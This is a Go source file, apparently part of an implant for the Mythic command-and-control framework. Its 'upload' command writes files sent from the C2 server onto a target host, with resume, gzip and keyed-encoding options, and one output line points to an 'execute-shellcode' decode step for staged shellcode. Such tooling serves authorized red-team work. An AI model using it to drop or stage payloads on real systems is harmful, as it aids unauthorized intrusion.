package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/files"
	"fawkes/pkg/structs"
)

// UploadCommand implements the upload command
type UploadCommand struct{}

// Name returns the command name
func (c *UploadCommand) Name() string {
	return "upload"
}

// Description returns the command description
func (c *UploadCommand) Description() string {
	return "Upload a file to the target system"
}

// UploadArgs represents the arguments for upload command
type UploadArgs struct {
	FileID     string `json:"file_id"`
	RemotePath string `json:"remote_path"`
	Overwrite  bool   `json:"overwrite"`
	Decompress bool   `json:"decompress"`
	Encode     string `json:"encode"`
}

// Execute executes the upload command
func (c *UploadCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[UploadArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	// Handle tilde expansion
	fixedFilePath := args.RemotePath
	if strings.HasPrefix(fixedFilePath, "~/") {
		dirname, err := os.UserHomeDir()
		if err != nil {
			return errorf("Failed to resolve home directory: %v", err)
		}
		fixedFilePath = filepath.Join(dirname, fixedFilePath[2:])
	}
	fullPath, err := filepath.Abs(fixedFilePath)
	if err != nil {
		return errorf("Failed to resolve absolute path for %s: %v", fixedFilePath, err)
	}

	encoding := args.Encode
	if encoding == "none" {
		encoding = ""
	}

	// Encode mode: accumulate all data, encode, write once
	if encoding != "" {
		return c.executeEncoded(task, fullPath, args, encoding)
	}

	// For decompress mode, write to a temp path first, then decompress to final path
	writePath := fullPath
	if args.Decompress {
		writePath = fullPath + ".gz.tmp"
		defer os.Remove(writePath) // Clean up temp file
	}

	// Check for an existing partial upload that can be resumed
	startChunk := 1
	resuming := false
	if !args.Decompress { // Resume only supported for direct writes (not decompress mode)
		existingState := files.GetTransferState(fullPath, files.TransferUpload)
		if existingState != nil && existingState.FileID == args.FileID {
			resuming = true
			startChunk = existingState.LastChunk + 1
		}
	}

	// Set up the file transfer request
	tfResult := &structs.FileTransferResult{}
	r := structs.GetFileFromMythicStruct{}
	r.FileID = args.FileID
	r.FullPath = fullPath
	r.Task = &task
	r.SendUserStatusUpdates = true
	r.TransferResult = tfResult
	r.StartChunk = startChunk

	// Check if file exists
	_, err = os.Stat(fullPath)
	fileExists := err == nil

	if fileExists && !args.Overwrite && !resuming {
		return errorf("File %s already exists. Reupload with the overwrite parameter, or remove the file before uploading again.", fullPath)
	}

	// Open file for writing:
	// - Resume: append mode (no truncate), seek to current file size
	// - Normal: truncate to start fresh
	var fp *os.File
	if resuming {
		fp, err = os.OpenFile(writePath, os.O_RDWR|os.O_CREATE, 0700)
		if err != nil {
			return errorf("Failed to open %s for resume: %v", writePath, err)
		}
		// Seek to end of existing partial content
		if _, seekErr := fp.Seek(0, 2); seekErr != nil {
			fp.Close()
			return errorf("Failed to seek to end of %s: %v", writePath, seekErr)
		}
	} else {
		fp, err = os.OpenFile(writePath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0700)
		if err != nil {
			return errorf("Failed to open %s for writing: %v", writePath, err)
		}
	}
	defer fp.Close() // Safety net: ensure fd is closed even if transfer goroutine panics
	r.ReceivedChunkChannel = make(chan []byte)
	task.Job.GetFileFromMythic <- r

	totalBytesWritten := 0
	var writeErr error
	for {
		newBytes := <-r.ReceivedChunkChannel
		if len(newBytes) == 0 {
			break
		}
		_, writeErr = fp.Write(newBytes)
		if writeErr != nil {
			break
		}
		totalBytesWritten += len(newBytes)
	}

	// Close file explicitly to flush writes and catch errors
	if closeErr := fp.Close(); closeErr != nil && writeErr == nil {
		writeErr = closeErr
	}

	if writeErr != nil {
		return errorf("writing to %s after %d bytes: %v", writePath, totalBytesWritten, writeErr)
	}

	if task.DidStop() {
		return errorResult("Task stopped early")
	}

	// Handle decompression if requested
	if args.Decompress {
		hash, decompBytes, decompErr := files.DecompressFileGzip(writePath, fullPath)
		if decompErr != nil {
			return errorf("decompressing file: %v", decompErr)
		}
		return successf("Uploaded and decompressed to %s\nCompressed: %s → Decompressed: %s\nDecompressed SHA256: %s",
			fullPath,
			formatFileSize(int64(totalBytesWritten)),
			formatFileSize(decompBytes),
			hash)
	}

	// Build output with hash info
	var output string
	if resuming {
		output = fmt.Sprintf("Resumed upload: wrote %d new bytes to %s (started at chunk %d)",
			totalBytesWritten, fullPath, startChunk)
	} else {
		output = fmt.Sprintf("Uploaded %d bytes to %s", totalBytesWritten, fullPath)
	}
	if tfResult.SHA256 != "" {
		output += fmt.Sprintf("\nSHA256 (transferred portion): %s", tfResult.SHA256)
	}
	return successResult(output)
}

func (c *UploadCommand) executeEncoded(task structs.Task, fullPath string, args UploadArgs, encoding string) structs.CommandResult {
	_, err := os.Stat(fullPath)
	if err == nil && !args.Overwrite {
		return errorf("File %s already exists. Reupload with the overwrite parameter, or remove the file before uploading again.", fullPath)
	}

	r := structs.GetFileFromMythicStruct{}
	r.FileID = args.FileID
	r.FullPath = fullPath
	r.Task = &task
	r.SendUserStatusUpdates = true
	r.TransferResult = &structs.FileTransferResult{}
	r.ReceivedChunkChannel = make(chan []byte)
	task.Job.GetFileFromMythic <- r

	var allData []byte
	for {
		chunk := <-r.ReceivedChunkChannel
		if len(chunk) == 0 {
			break
		}
		allData = append(allData, chunk...)
	}

	if task.DidStop() {
		return errorResult("Task stopped early")
	}

	originalSize := len(allData)
	encoded, keyHex, encErr := encodeData(allData, encoding)
	for i := range allData {
		allData[i] = 0
	}
	if encErr != nil {
		return errorf("Encoding failed: %v", encErr)
	}

	if writeErr := os.WriteFile(fullPath, encoded, 0700); writeErr != nil {
		return errorf("Failed to write encoded file to %s: %v", fullPath, writeErr)
	}

	return successf("Uploaded and encoded %s to %s\nOriginal: %s → Encoded: %s\nEncoding: %s\nKey: %s\nDecode: execute-shellcode -encoding %s -key %s",
		encoding, fullPath,
		formatFileSize(int64(originalSize)),
		formatFileSize(int64(len(encoded))),
		encoding, keyHex, encoding, keyHex)
}
